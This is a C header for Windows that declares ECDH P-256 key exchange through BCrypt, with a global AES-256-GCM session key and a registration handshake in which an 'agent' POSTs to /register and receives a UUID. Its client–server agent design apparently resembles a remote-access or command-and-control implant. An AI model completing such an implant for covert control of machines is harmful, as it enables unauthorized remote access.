#ifndef ECDH_H
#define ECDH_H

#include <windows.h>
#include <bcrypt.h>
#include <stdint.h>

/* 32-byte AES-256-GCM session key derived during registration.
 * Defined in ecdh.c, read by crypto.c. Written once by derive_session_key(). */
extern uint8_t SESSION_KEY[32];

/**
 * @brief Fill a buffer with cryptographically random bytes via BCrypt RNG.
 * @param buf Output buffer.
 * @param len Number of bytes to generate.
 */
void gen_random_bytes(uint8_t *buf, size_t len);

/**
 * @brief Generate an ephemeral ECDH-P256 keypair.
 * @param hPrivKey_out Receives the private key handle. Caller must call
 *                     BCryptDestroyKey() after derive_session_key().
 * @param our_pub_x962 Receives the 65-byte uncompressed public key (0x04 || X || Y).
 * @return 0 on success, -1 on failure.
 */
int gen_ecdh_keypair(BCRYPT_KEY_HANDLE *hPrivKey_out, uint8_t our_pub_x962[65]);

/**
 * @brief Import a peer's P-256 public key from X9.62 uncompressed format.
 * @param peer_x962 65-byte uncompressed public key (must start with 0x04).
 * @param hKey_out  Receives the imported key handle.
 * @return 0 on success, -1 on failure.
 */
int import_peer_pubkey(const uint8_t peer_x962[65], BCRYPT_KEY_HANDLE *hKey_out);

/**
 * @brief Perform ECDH key agreement and write SESSION_KEY = SHA-256(shared_secret_X).
 *        Destroys both key handles regardless of outcome.
 * @param hPrivKey Private key from gen_ecdh_keypair().
 * @param hPeerPub Peer public key from import_peer_pubkey().
 * @return 0 on success, -1 on failure.
 */
int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPeerPub);

/**
 * @brief Run the full registration handshake: generate keypair, POST to /register,
 *        receive server pubkey + UUID, derive SESSION_KEY.
 * @param agent_id      Output buffer for the null-terminated UUID string.
 * @param agent_id_size Size of the agent_id buffer in bytes.
 * @return 0 on success, -1 on failure.
 */
int do_register(char *agent_id, int agent_id_size);

#endif /* ECDH_H */
